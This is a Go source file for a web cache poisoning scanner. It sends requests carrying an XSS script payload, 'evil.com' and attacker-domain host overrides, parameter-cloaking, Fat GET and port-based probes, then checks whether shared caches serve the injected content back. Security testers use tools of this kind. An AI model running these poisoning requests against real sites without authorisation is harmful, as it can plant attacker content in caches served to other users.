package main

import (
	"bufio"
	"crypto/md5"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// VulnerabilityResult stores details about detected vulnerabilities
type VulnerabilityResult struct {
	URL             string
	VulnType        string
	Header          string
	Payload         string
	CacheStatus     string
	IsPoisoned      bool
	ResponseSnippet string
	Timestamp       time.Time
}

// Config holds the tool configuration
type Config struct {
	URLs            []string
	CustomHeaders   map[string]string
	Workers         int
	Timeout         time.Duration
	FollowRedirects bool
	Verbose         bool
}

// PoisonTester coordinates the cache poisoning tests
type PoisonTester struct {
	config  *Config
	client  *http.Client
	results []VulnerabilityResult
	mu      sync.Mutex
}

// Built-in headers to test for cache poisoning
var poisonHeaders = []string{
	"X-Forwarded-Host",
	"X-Forwarded-Scheme",
	"X-Original-URL",
	"X-Rewrite-URL",
	"X-Host",
	"X-Forwarded-Server",
	"X-Forwarded-Proto",
	"Forwarded",
	"X-Original-Host",
	"X-Host-Override",
	"X-HTTP-Host-Override",
	"X-Forwarded-Port",
	"X-Backend-Host",
	"X-Real-IP",
	"True-Client-IP",
	"Origin",
}

// Detection payloads for different attack vectors
var payloads = map[string]string{
	"xss":           `"><script>alert('WCP')</script>`,
	"redirect":      "evil.com",
	"host_override": "attacker-domain.com",
	"path_override": "/admin",
	"canary":        "cachepoisontest123",
}

func main() {
	urlFile 	:= flag.String("urls", "", "File containing list of URLs (one per line)")
	urlArg 		:= flag.String("url", "", "Single URL to test")
	headersFile := flag.String("headers", "", "File containing custom headers (format: Header: Value)")
	workers 	:= flag.Int("workers", 10, "Number of concurrent workers")
	timeout 	:= flag.Int("timeout", 10, "HTTP timeout in seconds")
	verbose 	:= flag.Bool("v", false, "Verbose output")
	output 	    := flag.String("o", "", "Output file for results (JSON)")
	
	flag.Parse()

	if *urlFile == "" && *urlArg == "" {
		fmt.Println("Error: Must provide either -url or -urls")
		flag.Usage()
		os.Exit(1)
	}

	config := &Config{
		Workers:         *workers,
		Timeout:         time.Duration(*timeout) * time.Second,
		FollowRedirects: false,
		Verbose:         *verbose,
		CustomHeaders:   make(map[string]string),
	}

	// Load URLs
	if *urlArg != "" {
		config.URLs = []string{*urlArg}
	} else {
		urls, err := loadURLs(*urlFile)
		if err != nil {
			fmt.Printf("Error loading URLs: %v\n", err)
			os.Exit(1)
		}
		config.URLs = urls
	}

	// Load custom headers
	if *headersFile != "" {
		headers, err := loadHeaders(*headersFile)
		if err != nil {
			fmt.Printf("Error loading headers: %v\n", err)
			os.Exit(1)
		}
		config.CustomHeaders = headers
	}

	tester := NewPoisonTester(config)
	
	fmt.Printf("[*] Starting Web Cache Poisoning Detection\n")
	fmt.Printf("[*] Testing %d URLs with %d workers\n", len(config.URLs), config.Workers)
	fmt.Printf("[*] Using %d built-in headers + %d custom headers\n\n", 
		len(poisonHeaders), len(config.CustomHeaders))

	tester.Run()

	fmt.Printf("\n[+] Scan Complete!\n")
	fmt.Printf("[+] Found %d potential vulnerabilities\n\n", len(tester.results))

	// Display results
	tester.PrintResults()

	// Save to file if requested
	if *output != "" {
		if err := tester.SaveResults(*output); err != nil {
			fmt.Printf("[-] Error saving results: %v\n", err)
		} else {
			fmt.Printf("[+] Results saved to: %s\n", *output)
		}
	}
}

// NewPoisonTester creates a new tester instance
func NewPoisonTester(config *Config) *PoisonTester {
	client := &http.Client{
		Timeout: config.Timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:    config.Workers * 2,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if !config.FollowRedirects {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	return &PoisonTester{
		config:  config,
		client:  client,
		results: make([]VulnerabilityResult, 0),
	}
}

// Run executes the cache poisoning detection
func (pt *PoisonTester) Run() {
	var wg sync.WaitGroup
	urlChan := make(chan string, len(pt.config.URLs))

	// Start workers
	for i := 0; i < pt.config.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for targetURL := range urlChan {
				pt.testURL(targetURL, workerID)
			}
		}(i)
	}

	// Feed URLs to workers
	for _, targetURL := range pt.config.URLs {
		urlChan <- targetURL
	}
	close(urlChan)

	wg.Wait()
}

// testURL performs all cache poisoning tests on a single URL
func (pt *PoisonTester) testURL(targetURL string, workerID int) {
	if pt.config.Verbose {
		fmt.Printf("[Worker %d] Testing: %s\n", workerID, targetURL)
	}

	// Test 1: Cache key probing - identify unkeyed inputs
	pt.probeCacheKey(targetURL)

	// Test 2: Header-based poisoning
	pt.testHeaderPoisoning(targetURL)

	// Test 3: Query parameter cloaking
	pt.testParameterCloaking(targetURL)

	// Test 4: Fat GET poisoning
	pt.testFatGET(targetURL)

	// Test 5: Port-based poisoning
	pt.testPortPoisoning(targetURL)

	// Test 6: Custom headers
	for header, value := range pt.config.CustomHeaders {
		pt.testCustomHeader(targetURL, header, value)
	}
}

// probeCacheKey identifies which request components are keyed
func (pt *PoisonTester) probeCacheKey(targetURL string) {
	// Add a unique cachebuster parameter
	cacheBuster := fmt.Sprintf("cb=%d", time.Now().UnixNano())
	testURL := addQueryParam(targetURL, cacheBuster)

	// Test if port is excluded from cache key
	resp1 := pt.makeRequest(testURL, "Host", addPort(extractHost(targetURL), "1337"), nil)
	if resp1 == nil {
		return
	}

	resp2 := pt.makeRequest(testURL, "", "", nil)
	if resp2 == nil {
		return
	}

	if pt.isCacheHit(resp2) && pt.responsesMatch(resp1, resp2) {
		pt.addResult(VulnerabilityResult{
			URL:         targetURL,
			VulnType:    "Cache Key - Port Not Keyed",
			Header:      "Host",
			CacheStatus: pt.getCacheStatus(resp2),
			IsPoisoned:  true,
			Timestamp:   time.Now(),
		})
	}
}

// testHeaderPoisoning tests standard cache poisoning headers
func (pt *PoisonTester) testHeaderPoisoning(targetURL string) {
	for _, header := range poisonHeaders {
		for payloadName, payload := range payloads {
			cacheBuster := fmt.Sprintf("wptest=%d", time.Now().UnixNano())
			testURL := addQueryParam(targetURL, cacheBuster)

			// Phase 1: Poison the cache
			resp1 := pt.makeRequest(testURL, header, payload, nil)
			if resp1 == nil {
				continue
			}

			time.Sleep(100 * time.Millisecond)

			// Phase 2: Check if poisoned response is served
			resp2 := pt.makeRequest(testURL, "", "", nil)
			if resp2 == nil {
				continue
			}

			if pt.isCacheHit(resp2) && strings.Contains(resp2.Body, payload) {
				pt.addResult(VulnerabilityResult{
					URL:             testURL,
					VulnType:        fmt.Sprintf("Header Poisoning - %s", payloadName),
					Header:          header,
					Payload:         payload,
					CacheStatus:     pt.getCacheStatus(resp2),
					IsPoisoned:      true,
					ResponseSnippet: extractSnippet(resp2.Body, payload),
					Timestamp:       time.Now(),
				})

				if pt.config.Verbose {
					fmt.Printf("[!] VULN: %s vulnerable to %s poisoning via %s\n", 
						targetURL, payloadName, header)
				}
			}
		}
	}
}

// testParameterCloaking tests cache parameter cloaking attacks
func (pt *PoisonTester) testParameterCloaking(targetURL string) {
	cloakingTests := []struct {
		name    string
		param   string
		canary  string
	}{
		{"Semicolon Delimiter", "utm_content=legit;callback=", "alert(1)"},
		{"Question Mark in Param", "q=test?cb=", "malicious"},
		{"Akamai Transform", "x=1?akamai-transform=", "payload"},
	}

	for _, test := range cloakingTests {
		cacheBuster := fmt.Sprintf("test=%d", time.Now().UnixNano())
		poisonURL := addQueryParam(targetURL, test.param+test.canary+"&"+cacheBuster)

		resp1 := pt.makeRequest(poisonURL, "", "", nil)
		if resp1 == nil {
			continue
		}

		time.Sleep(100 * time.Millisecond)

		// Try to retrieve with clean parameters
		cleanURL := addQueryParam(targetURL, cacheBuster)
		resp2 := pt.makeRequest(cleanURL, "", "", nil)
		if resp2 == nil {
			continue
		}

		if pt.isCacheHit(resp2) && strings.Contains(resp2.Body, test.canary) {
			pt.addResult(VulnerabilityResult{
				URL:         targetURL,
				VulnType:    fmt.Sprintf("Parameter Cloaking - %s", test.name),
				Payload:     test.param + test.canary,
				CacheStatus: pt.getCacheStatus(resp2),
				IsPoisoned:  true,
				Timestamp:   time.Now(),
			})
		}
	}
}

// testFatGET tests for Fat GET vulnerabilities
func (pt *PoisonTester) testFatGET(targetURL string) {
	cacheBuster := fmt.Sprintf("fatget=%d", time.Now().UnixNano())
	testURL := addQueryParam(targetURL, "param=legitimate&"+cacheBuster)

	bodyData := "param=poisoned_value"

	// Phase 1: Send GET with body
	resp1 := pt.makeRequest(testURL, "", "", strings.NewReader(bodyData))
	if resp1 == nil {
		return
	}

	time.Sleep(100 * time.Millisecond)

	// Phase 2: Normal GET to see if body params were cached
	resp2 := pt.makeRequest(testURL, "", "", nil)
	if resp2 == nil {
		return
	}

	if pt.isCacheHit(resp2) && strings.Contains(resp2.Body, "poisoned_value") {
		pt.addResult(VulnerabilityResult{
			URL:         targetURL,
			VulnType:    "Fat GET Poisoning",
			Payload:     bodyData,
			CacheStatus: pt.getCacheStatus(resp2),
			IsPoisoned:  true,
			Timestamp:   time.Now(),
		})

		if pt.config.Verbose {
			fmt.Printf("[!] VULN: %s vulnerable to Fat GET poisoning\n", targetURL)
		}
	}
}

// testPortPoisoning tests port-based cache key manipulation
func (pt *PoisonTester) testPortPoisoning(targetURL string) {
	cacheBuster := fmt.Sprintf("port=%d", time.Now().UnixNano())
	testURL := addQueryParam(targetURL, cacheBuster)

	host := extractHost(targetURL)
	hostWithPort := addPort(host, "8080")

	// Phase 1: Request with non-standard port
	resp1 := pt.makeRequest(testURL, "Host", hostWithPort, nil)
	if resp1 == nil {
		return
	}

	time.Sleep(100 * time.Millisecond)

	// Phase 2: Request without port
	resp2 := pt.makeRequest(testURL, "", "", nil)
	if resp2 == nil {
		return
	}

	if pt.isCacheHit(resp2) && (strings.Contains(resp2.Body, ":8080") || 
		strings.Contains(resp2.Headers["Location"], ":8080")) {
		pt.addResult(VulnerabilityResult{
			URL:         targetURL,
			VulnType:    "Port Poisoning",
			Header:      "Host",
			Payload:     hostWithPort,
			CacheStatus: pt.getCacheStatus(resp2),
			IsPoisoned:  true,
			Timestamp:   time.Now(),
		})
	}
}

// testCustomHeader tests a custom header provided by user
func (pt *PoisonTester) testCustomHeader(targetURL, header, value string) {
	cacheBuster := fmt.Sprintf("custom=%d", time.Now().UnixNano())
	testURL := addQueryParam(targetURL, cacheBuster)

	resp1 := pt.makeRequest(testURL, header, value, nil)
	if resp1 == nil {
		return
	}

	time.Sleep(100 * time.Millisecond)

	resp2 := pt.makeRequest(testURL, "", "", nil)
	if resp2 == nil {
		return
	}

	if pt.isCacheHit(resp2) && strings.Contains(resp2.Body, value) {
		pt.addResult(VulnerabilityResult{
			URL:         targetURL,
			VulnType:    "Custom Header Poisoning",
			Header:      header,
			Payload:     value,
			CacheStatus: pt.getCacheStatus(resp2),
			IsPoisoned:  true,
			Timestamp:   time.Now(),
		})
	}
}

// HTTPResponse holds response data
type HTTPResponse struct {
	StatusCode int
	Headers    map[string]string
	Body       string
	Hash       string
}

// makeRequest performs an HTTP request with optional custom header
func (pt *PoisonTester) makeRequest(targetURL, header, value string, body io.Reader) *HTTPResponse {
	req, err := http.NewRequest("GET", targetURL, body)
	if err != nil {
		return nil
	}

	// Set custom header if provided
	if header != "" && value != "" {
		req.Header.Set(header, value)
	}

	// Set common headers
	req.Header.Set("User-Agent", "WCP-Scanner/1.0")
	req.Header.Set("Accept", "*/*")

	resp, err := pt.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	headers := make(map[string]string)
	for k, v := range resp.Header {
		if len(v) > 0 {
			headers[k] = v[0]
		}
	}

	bodyStr := string(bodyBytes)
	hash := fmt.Sprintf("%x", md5.Sum(bodyBytes))

	return &HTTPResponse{
		StatusCode: resp.StatusCode,
		Headers:    headers,
		Body:       bodyStr,
		Hash:       hash,
	}
}

// isCacheHit checks if response indicates a cache hit
func (pt *PoisonTester) isCacheHit(resp *HTTPResponse) bool {
	if resp == nil {
		return false
	}

	cacheIndicators := map[string][]string{
		"CF-Cache-Status":    {"HIT"},
		"X-Cache":            {"HIT", "TCP_HIT"},
		"X-Cache-Hit":        {"true", "1"},
		"Age":                {},  // Presence indicates cached
		"X-Served-By":        {},  // CDN indicator
		"X-Cache-Status":     {"HIT"},
	}

	for header, values := range cacheIndicators {
		if val, exists := resp.Headers[header]; exists {
			if len(values) == 0 {
				return true
			}
			for _, v := range values {
				if strings.Contains(strings.ToUpper(val), v) {
					return true
				}
			}
		}
	}

	return false
}

// getCacheStatus extracts cache status from response
func (pt *PoisonTester) getCacheStatus(resp *HTTPResponse) string {
	if resp == nil {
		return "UNKNOWN"
	}

	statusHeaders := []string{
		"CF-Cache-Status", "X-Cache", "X-Cache-Status", 
		"X-Cache-Hit", "Cache-Status",
	}

	for _, header := range statusHeaders {
		if val, exists := resp.Headers[header]; exists {
			return val
		}
	}

	if _, exists := resp.Headers["Age"]; exists {
		return "CACHED"
	}

	return "MISS"
}

// responsesMatch checks if two responses are similar
func (pt *PoisonTester) responsesMatch(resp1, resp2 *HTTPResponse) bool {
	if resp1 == nil || resp2 == nil {
		return false
	}
	return resp1.Hash == resp2.Hash || 
		(resp1.StatusCode == resp2.StatusCode && 
		 len(resp1.Body) > 0 && len(resp1.Body) == len(resp2.Body))
}

// addResult safely adds a result to the results slice
func (pt *PoisonTester) addResult(result VulnerabilityResult) {
	pt.mu.Lock()
	defer pt.mu.Unlock()
	pt.results = append(pt.results, result)
}

// PrintResults displays the scan results
func (pt *PoisonTester) PrintResults() {
	if len(pt.results) == 0 {
		fmt.Println("[-] No vulnerabilities detected")
		return
	}

	fmt.Println("==================================================")
	fmt.Println("DETECTED VULNERABILITIES")
	fmt.Println("==================================================")

	for i, result := range pt.results {
		fmt.Printf("\n[%d] %s\n", i+1, result.VulnType)
		fmt.Printf("    URL: %s\n", result.URL)
		if result.Header != "" {
			fmt.Printf("    Header: %s\n", result.Header)
		}
		if result.Payload != "" {
			fmt.Printf("    Payload: %s\n", result.Payload)
		}
		fmt.Printf("    Cache Status: %s\n", result.CacheStatus)
		fmt.Printf("    Poisoned: %v\n", result.IsPoisoned)
		if result.ResponseSnippet != "" {
			fmt.Printf("    Snippet: %s\n", result.ResponseSnippet)
		}
		fmt.Printf("    Timestamp: %s\n", result.Timestamp.Format(time.RFC3339))
	}
	fmt.Println()
}

// SaveResults saves results to a file
func (pt *PoisonTester) SaveResults(filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	file.WriteString("[\n")
	for i, result := range pt.results {
		file.WriteString(fmt.Sprintf(`  {
    "url": "%s",
    "vuln_type": "%s",
    "header": "%s",
    "payload": "%s",
    "cache_status": "%s",
    "is_poisoned": %v,
    "timestamp": "%s"
  }`, result.URL, result.VulnType, result.Header, 
			escapeJSON(result.Payload), result.CacheStatus, 
			result.IsPoisoned, result.Timestamp.Format(time.RFC3339)))
		
		if i < len(pt.results)-1 {
			file.WriteString(",\n")
		}
	}
	file.WriteString("\n]\n")

	return nil
}

// Utility functions

func loadURLs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			urls = append(urls, line)
		}
	}

	return urls, scanner.Err()
}

func loadHeaders(filename string) (map[string]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	headers := make(map[string]string)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
		}
	}

	return headers, scanner.Err()
}

func addQueryParam(targetURL, param string) string {
	separator := "?"
	if strings.Contains(targetURL, "?") {
		separator = "&"
	}
	return targetURL + separator + param
}

func extractHost(targetURL string) string {
	u, err := url.Parse(targetURL)
	if err != nil {
		return ""
	}
	return u.Host
}

func addPort(host, port string) string {
	// Remove existing port if present
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		host = host[:idx]
	}
	return host + ":" + port
}

func extractSnippet(body, payload string) string {
	idx := strings.Index(body, payload)
	if idx == -1 {
		return ""
	}

	start := idx - 50
	if start < 0 {
		start = 0
	}

	end := idx + len(payload) + 50
	if end > len(body) {
		end = len(body)
	}

	return strings.TrimSpace(body[start:end])
}

func escapeJSON(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	s = strings.ReplaceAll(s, "\n", "\\n")
	s = strings.ReplaceAll(s, "\r", "\\r")
	s = strings.ReplaceAll(s, "\t", "\\t")
	return s
}
